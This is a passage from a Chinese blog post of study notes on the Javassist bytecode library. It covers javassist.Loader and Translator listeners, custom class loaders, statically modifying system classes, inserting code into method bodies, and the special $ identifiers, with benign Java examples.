class="keyword">return</span> x; &#125;</span><br><span class="line">        :</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用javassist-Loader"><a href="#使用javassist-Loader" class="headerlink" title="使用javassist.Loader"></a>使用javassist.Loader</h3><p>Javassist提供了一个类加载器<code>javassist.Loader</code>，这个类加载器使用<code>javassist.ClassPool</code>对象读取class文件。</p><p>例如，<code>javassist.Loader</code>可用于使用javassist修改的指定的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line"><span class="comment">// 使用ClassPool创建Loader</span></span><br><span class="line">Loader cl = <span class="keyword">new</span> Loader(pool);</span><br><span class="line"></span><br><span class="line">CtClass ct = pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Rectangle"</span>);</span><br><span class="line">ct.setSuperclass(pool.get(<span class="string">"org.byron4j.cookbook.javaagent.Point"</span>));</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; c = cl.loadClass(<span class="string">"org.byron4j.cookbook.javaagent.Rectangle"</span>);</span><br><span class="line">Object o = c.newInstance();</span><br></pre></td></tr></table></figure><p>这个程序修改了类Rectangle类，将其父类设置为Point类，然后程序加载了修改后的Rectangle类，并且创建了一个实例。</p><p><strong>如果用户想在加载一个类的时候按需修改它，则用户可以添加一个<code>javassist.Loader</code>的事件监听器。当这个类加载器加载一个类的时候就会通知添加好的事件监听器。</strong> 事件监听器必须实现以下两个接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Translator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(ClassPool pool)</span> </span></span><br><span class="line"><span class="function">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><ol><li>当javassist.Loader中的addTranslator()将这个事件监听器添加到javassist.Loader对象中时，start()方法被调用。</li><li>方法onLoad()在javassist.Loader加载一个类之前被调用。onLoad()可以修改加载类的定义。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Loader的观察者</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Translator</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 当对象附加到加载器对象时，加载器将调用该对象进行初始化。此方法可用于获取(用于缓存)一些将在Translator的onLoad()中访问的CtClass对象。</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> pool</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> NotFoundException</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> CannotCompileException</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(ClassPool pool)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NotFoundException, CannotCompileException</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 当Loader加载一个类时，就会通知调用该方法。Loader会在onLoad()方法返回后调用</span></span><br><span class="line"><span class="comment">    *     pool.get(classname).toBytecode()</span></span><br><span class="line"><span class="comment">    * 方法去读取class文件，classname可能是尚未创建的类的名称。</span></span><br><span class="line"><span class="comment">    * 如果这样的话，&lt;code&gt;onLoad()&lt;/code&gt;方法必须创建那个class，以便Loader可以在&lt;code&gt;onLoad()&lt;/code&gt;方法返回后读取它。</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> pool</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> classname</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> NotFoundException</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> CannotCompileException</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NotFoundException, CannotCompileException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>javassist.Loader</code>对象的<code>addTranslator()</code>方法添加事件监听器的时候，<code>start()</code>方法就会被调用。 <code>onLoad()</code>方法会在<code>javassist.Loader</code>加载一个类之前被调用。</p><p> 以下是这两种情况的源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加事件监听器的时候，就会调用监听器的start方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addTranslator</span><span class="params">(ClassPool cp, Translator t)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException </span>&#123;</span><br><span class="line">    source = cp;</span><br><span class="line">    translator = t;</span><br><span class="line">    t.start(cp);<span class="comment">//&lt;---</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存在监听器，则在Loader的findClass方法中，先执行监听器的onLoad()方法，再通过.get(name).toBytecode()加载类</span></span><br><span class="line"><span class="keyword">if</span> (source != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (translator != <span class="keyword">null</span>)</span><br><span class="line">        translator.onLoad(source, name);<span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        classfile = source.get(name).toBytecode();<span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>所以，<code>translator.onLoad</code>的方法中可以修改加载的类的定义。</strong></p><p>例如，下面的事件监听器在加载之前将所有的类改为公共类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTranslator</span> <span class="keyword">implements</span> <span class="title">Translator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">(ClassPool pool)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NotFoundException, CannotCompileException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onLoad</span><span class="params">(ClassPool pool, String classname)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> NotFoundException, CannotCompileException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        CtClass cc = pool.get(classname);</span><br><span class="line">        cc.setModifiers(Modifier.PUBLIC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请注意，onLoad()不必调用toBytecode()或writeFile()，因为javassist.Loader调用这些方法来获取类文件。</p><p>要运行一个带有MyTranslator对象的应用程序类MyApp，需要写一个主类，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"com.sec.Point#main invoked!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main2</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">     Translator t = <span class="keyword">new</span> MyTranslator();</span><br><span class="line">     ClassPool pool = ClassPool.getDefault();</span><br><span class="line">     Loader cl = <span class="keyword">new</span> Loader();</span><br><span class="line">     cl.addTranslator(pool, t);</span><br><span class="line">     <span class="comment">// cl.run方法会运行指定MyApp的main方法</span></span><br><span class="line">     cl.run(<span class="string">"com.sec.Point"</span>, args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">% java Main2 arg1 arg2</span><br></pre></td></tr></table></figure><p>注意：应用的类像Point是不能访问加载器的类如MyTranslator、ClassPool的，因为它们是被不同的加载器加载的。应用的类是由javassist.Loader加载，而其他的是由默认的JVM类加载器加载的。</p><p><code>javassist.Loader</code>加载类的顺序和<code>java.lang.ClassLoader</code>不同。 <code>ClassLoader</code>首先将加载操作委托给父加载器，如果父加载器找不到它们才由自身尝试加载类。 反过来说，<code>javassist.Loader</code>在委托给父加载器之前尝试加载类。只有在以下情况才去委托父加载器：</p><ul><li>类不是由<code>ClassPool.get()</code>找到的</li><li>类使用了<code>delegateLoadingOf()</code>去指定由父加载器加载。</li></ul><p>这个搜索顺序允许Javassist加载修改过的类。然而，如果加载失败的话就会委托给父加载器去加载。一旦一个类由其父加载器加载了，这个类引用的其它类也会由其父加载器加载，则这些类就不会被当前类加载器修改了。 回想一下，类C中所有引用的类都是由类C的真实加载器负责加载的。<strong><em>如果你的程序不能加载一个修改过的类，</em></strong>你应该确保所有使用该类的类都已经被<code>javassist.Loader</code>加载了。</p><h3 id="编写一个类加载器"><a href="#编写一个类加载器" class="headerlink" title="编写一个类加载器"></a>编写一个类加载器</h3><p>一个使用Javassist的简单类加载器如下，继承ClassLoader。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SampleLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> ClassPool pool;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SampleLoader</span><span class="params">()</span> <span class="keyword">throws</span> NotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.pool = ClassPool.getDefault();</span><br><span class="line">        <span class="keyword">this</span>.pool.insertClassPath(<span class="string">"./target/classes"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        CtClass cc;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            cc = pool.get(name);</span><br><span class="line">            <span class="comment">//TODO</span></span><br><span class="line">            <span class="keyword">byte</span>[] bb = cc.toBytecode();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,bb,<span class="number">0</span>,bb.length);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SampleLoader sl = <span class="keyword">new</span> SampleLoader();</span><br><span class="line">        Class&lt;?&gt; cl = sl.loadClass(<span class="string">"com.sec.Point"</span>);</span><br><span class="line">        cl.getDeclaredMethod("main",new Class[]&#123;String[].class&#125;).invoke(null,new Object[]&#123;args&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设Point是一个应用程序，为了执行这个程序，首先指定<code>./target/classes</code>为class文件目录。构造器中<code>insertClassPath()</code>方法指定了目录名称<code>./target/classes</code>，你可以使用不同的目录名称来代替你想要加载的类路径地址。 执行该程序，类加载器会加载Point类(Point.class文件)并且调用其main方法。</p><p>这是使用javassist最简单的示例。然而，如果你想编写一个更加复杂的类加载器，你需要了解更多的java类加载的机制。例如，上面的程序将Point类在命名空间与SampleLoader命名空间分开了，因为这两个是由不同的类加载器加载的。因此，Point类不能直接访问SampleLoader类。</p><h3 id="修改一个系统类"><a href="#修改一个系统类" class="headerlink" title="修改一个系统类"></a>修改一个系统类</h3><p>java.lang.String等系统类不能被系统类加载器以外的类加载器加载。因此，上图所示的SampleLoader或javassist.Loader不能在加载时修改系统类。</p><p>如果你的应用想那样去做的话（修改系统类），必须<strong><em>静态地</em></strong>修改系统类。</p><p>例如，添加一个新的属性字段给<code>java.lang.String</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加字段给系统类：java.lang.String</span></span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass ctClass = pool.get(<span class="string">"java.lang.String"</span>);</span><br><span class="line"><span class="comment">// 创建字段</span></span><br><span class="line">CtField cf = <span class="keyword">new</span> CtField(CtClass.intType, <span class="string">"hiddenValue"</span>, ctClass);</span><br><span class="line">cf.setModifiers(Modifier.PUBLIC);</span><br><span class="line"><span class="comment">//添加字段</span></span><br><span class="line">ctClass.addField(cf);</span><br><span class="line">ctClass.writeFile(<span class="string">"."</span>);</span><br></pre></td></tr></table></figure><p>这个程序产生一个文件”./java/lang/String.class”。</p><p><code>% java -Xbootclasspath/p:. MyApp arg1 arg2...</code></p><h3 id="在运行时重新加载一个类"><a href="#在运行时重新加载一个类" class="headerlink" title="在运行时重新加载一个类"></a>在运行时重新加载一个类</h3><p><strong><em>如果启动JVM时启动了JPDA</em></strong>，则一个类可以重加载。在JVM加载一个类后，旧的版本的类的定义可以卸载，新的版本可以重新加载。 换言之，类的定义可以在运行时动态修改。然而，一个新的类的定义必须与旧的类定义在某种程度上兼容。 <strong><em>JVM不允许两个版本之间更改模式。</em></strong> 它们拥有相同的方法、成员变量。</p><p>Javassist提供了一个方便的类，用于在运行时重载一个类。更多信息，请参见 javassist.tools.HotSwapper 的 API 文档。</p><h2 id="自省-amp-定制化"><a href="#自省-amp-定制化" class="headerlink" title="自省 &amp; 定制化"></a>自省 &amp; 定制化</h2><p><code>CtClass</code>提供了自省的一些方法。Javassist的内省功能和Java反射API的内省功能兼容。 <code>CtClass</code>提供了<code>getName()</code>、<code>getSuperclass()</code>、<code>getMethods()</code>等等方法。<code>CtClass</code>也提供了修改类定义的方法，允许添加一个新的成员变量、构造器、方法，也可以检测方法体。 方法由<code>CtMethod</code>对象表示。<code>CtMethod</code>提供了修改方法定义的几个方法。注意：如果一个方法继承了某个类，则CtMethod表示为是在父类中声明的方法。一个<code>CtMethod</code>对象对应一个方法声明。</p><p>例如，如果类Point声明了一个方法move()，而Point类的的一个子类ColorPoint没有覆盖move()方法，这两个move()方法即Point中声名的和ColorPoint中继承的都由相同的CtMethod对象表示。如果修改这个CtMethod对象标表示的方法的定义，则修改会表现到这两个方法上。如果你仅仅想修改ColorPoint中的该方法，你首先必须给ColorPoint添加一个表示move()方法的CtMethod的副本，可以通过<code>CtNewMethod.copy()</code>方法获得。</p><p>Javassist不允许移除一个方法或者成员变量，但是允许变更方法名。所以如果一个方法不再需要了，应该重命名并且修改为私有的：调用CtMethod中的<code>setName()</code>和<code>setModifiers()</code>方法。 </p><p>Javassist不允许在一个已存在的方法中添加额外的参数，为了处理这样的变更，接受额外参数或者其他参数的新方法应该添加在同一个类中。例如，如果你想在一个方法中添加一个额外的参数： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> newX, <span class="keyword">int</span> newY)</span> </span>&#123; x = newX; y = newY; &#125;</span><br></pre></td></tr></table></figure><p>改成:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> newX, <span class="keyword">int</span> newY, <span class="keyword">int</span> newZ)</span> </span>&#123;    </span><br><span class="line">  <span class="comment">// do what you want with newZ.    </span></span><br><span class="line">  move(newX, newY); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Javassist 也提供了更低层次的API可以直接编辑原生class文件。例如,CtClass的<code>getClassFile()</code>返回一个<code>ClassFile</code>对象表示一个原生class文件。 CtMethod中的<code>getMethodInfo()</code>方法返回一个<code>MethodInfo</code>对象表示在class文件中的一个<code>method_info</code>结构。 低层次的API使用了来自JVM规范的词汇。用户必须了解class文件和字节码。更多的细节，可以参考<a href="http://www.javassist.org/tutorial/tutorial3.html#intro" target="_blank" rel="noopener">javassist.bytecode包</a>。</p><p>如果需要被修改的类包含以下以<code>$</code>开头的特殊标识符，则在运行时需要<code>javassist.runtime</code>包来支持。</p><h3 id="在方法体的前部、后部插入代码"><a href="#在方法体的前部、后部插入代码" class="headerlink" title="在方法体的前部、后部插入代码"></a>在方法体的前部、后部插入代码</h3><p><code>CtMethod</code>和<code>CtConstructor</code>提供了<code>insertBefore()</code>,<code>insertAfter()</code>和<code>addCatch()</code>方法。他们都是在已存在的方法体中插入代码段，用户可以使用Java中的<strong>源代码文本方式编写代码段</strong>。<strong>Javassist包含一个简单的Java编译器用于处理源文本，接收Java中的源文本并编译成字节码到方法体中。</strong></p><p>插入代码段在指定行也是可以的（如果行号表在class文件中的话），<code>CtMethod</code>和<code>CtConstructor</code>的<code>insertAt()</code>方法在源class文件中获取源文本和行号，它将编译源文本并且在指定行插入编译过的代码。 </p><p>语句和代码块可以指的是字段和方法。特殊变量<code>$0，$1，$2，</code>…来访问方法参数。虽然允许在块中声明一个新的局部变量，但不允许访问方法中声明的局部变量。然而，<code>insertAt()</code>允许语句和代码块访问局部变量，如果这些变量在指定的行号处可用，并且目标方法是用-g选项编译的。</p><p>传递给方法<code>insertBefore()</code>、<code>insertAfter()</code>、<code>addCatch()</code>和<code>insertAt()</code>的String对象是由Javassist中包含的编译器编译的。由于编译器支持语言扩展，所以几个以$开头的标识符具有特殊的意义。</p><p><img src="../images/Javassist%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210217231334157.png" alt="image-20210217231334157"></p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>$0</code>, <code>$1</code>, <code>$2</code>, …</td><td><code>this</code> and 方法的参数</td></tr><tr><td><code>$args</code></td><td>方法参数数组.它的类型为 <code>Object[]</code></td></tr><tr><td><code>$$</code></td><td>所有实参。例如, <code>m($$)</code> 等价于 <code>m($1,$2,</code>…<code>)</code></td></tr><tr><td><code>$cflow(</code>…<code>)</code></td><td><code>cflow</code> 变量</td></tr><tr><td><code>$r</code></td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td><code>$w</code></td><td>包装器类型，用于强制类型转换</td></tr><tr><td><code>$_</code></td><td>返回值</td></tr><tr><td><code>$sig</code></td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td><code>$type</code></td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td><code>$class</code></td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr></tbody></table><h4 id="0-1-2"><a href="#0-1-2" class="headerlink" title="$0,$1,$2"></a><code>$0,$1,$2</code></h4><p>传递给目标方法的参数可以用<code>$1</code>，<code>$2</code>，…代替原来的参数名进行访问。1元代表第一个参数，2元代表第二个参数，以此类推。这些变量的类型与参数类型相同。<code>$0</code>相当于这样。如果方法是静态的，则<code>$0</code>不可用。</p><p>这些变量的用法如下。假设一个类Point:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> dx, <span class="keyword">int</span> dy)</span> </span>&#123; x += dx; y += dy; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要在调用move()方法时打印dx和dy的值，请执行这个程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault(); </span><br><span class="line">CtClass cc = pool.get(<span class="string">"Point"</span>); </span><br><span class="line">CtMethod m = cc.getDeclaredMethod(<span class="string">"move"</span>); </span><br><span class="line">m.insertBefore(<span class="string">"&#123; System.out.println($1); System.out.println($2); &#125;"</span>); </span><br><span class="line">cc.writeFile();</span><br></pre></td></tr></table></figure><p>修改后的Point类的定义是这样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x, y;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> dx, <span class="keyword">int</span> dy)</span> </span>&#123;</span><br><span class="line">        &#123; </span><br><span class="line">          System.out.println(dx); </span><br><span class="line">          System.out.println(dy); </span><br><span class="line">        &#125;</span><br><span class="line">        x += dx; y += dy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$1</code>和<code>$2</code>分别由dx和dy代替。</p><p><code>$1</code>, <code>$2</code>, <code>$3</code> …是可以更新的。如果变量值更改了，那么参数的值也会更新。</p><h4 id="args"><a href="#args" class="headerlink" title="$args"></a><code>$args</code></h4><p>变量<code>$args</code>表示<strong>装载所有参数的参数数组</strong>。该变量的类型是一个Object类的数组。如果一个参数类型是一个基本类型，比如int，那么参数值就会被转换为一个包装对象，比如java.lang.Integer来存储在<code>$args</code>中。因此，<code>$args[0]</code>相当于<code>$1</code>，除非第一个参数的类型是一个基本类型。请注意，<code>$args[0]</code>并不等同于​<code>$0</code>，<code>$0</code>代表了<code>this</code>。</p><p>如果一个Object数组被分配给$args，那么该数组的每个元素都被分配给每个参数。如果一个参数类型是基本类型，那么对应元素的类型必须是封装类型。在将值分配给参数之前，会将其从封装类型转换为基本类型。</p><h4 id><a href="#" class="headerlink" title="$$"></a><code>$$</code></h4><p>变量 $$ 是所有参数列表的缩写，用逗号分隔。 例如，如果方法 move() 的有 3 个参数，则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move($$) == move($<span class="number">1</span>, $<span class="number">2</span>, $<span class="number">3</span>)</span><br><span class="line">exMove($$, context) == exMove($<span class="number">1</span>, $<span class="number">2</span>, $<span class="number">3</span>, context)</span><br></pre></td></tr></table></figure><p>如果move()不接受任何参数，那么move($$)相当于move()。</p><p>请注意，$$使方法调用的通用符号与参数数量相关。它通常与后面的$proceed一起使用。</p><h4 id="cflow"><a href="#cflow" class="headerlink" title="$cflow"></a><code>$cflow</code></h4><p>$cflow的意思是 “控制流”。这个只读变量返回特定方法的递归调用深度。</p><p>假设下面所示的方法由CtMethod对象cm表示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fact</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> n * fact(n - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要使用<code>$cflow</code>，首先声明<code>$cflow</code>用于监控对方法fact()的调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CtMethod cm = ...;</span><br><span class="line">cm.useCflow(<span class="string">"fact"</span>);</span><br></pre></td></tr></table></figure><p>useCflow()的参数是声明的$cflow变量的标识符。任何有效的Java名称都可以作为标识符。由于标识符也可以包含<code>.</code>，例如，<code>my.Test.fact</code>就是一个有效的标识符。</p><p>那么，<code>$cflow(fact)</code>表示cm指定的方法的递归调用的深度。当方法第一次被调用时，$cflow(fact)的值是0，而当方法内部被递归调用时，它的值是1。例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cm.insertBefore(<span class="string">"if ($cflow(fact) == 0)"</span></span><br><span class="line">              + <span class="string">"    System.out.println(\"fact \" + $1);"</span>);</span><br></pre></td></tr></table></figure><p>翻译方法fact()，以便它显示参数。因为检查了 $cflow(fact) 的值，所以如果在 fact() 中递归调用，则方法 fact() 不会显示参数。</p><p><code>$cflow</code>的值是当前线程当前最上面的栈帧下与指定方法cm相关联的栈帧数。在与指定方法cm不同的方法中也可以访问$cflow。</p><h4 id="r"><a href="#r" class="headerlink" title="$r"></a><code>$r</code></h4><p>$r 表示方法的结果类型（返回类型）。它用在 cast 表达式中作 cast 转换类型。 下面是一个典型的用法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object result = ... ;</span><br><span class="line">$_ = 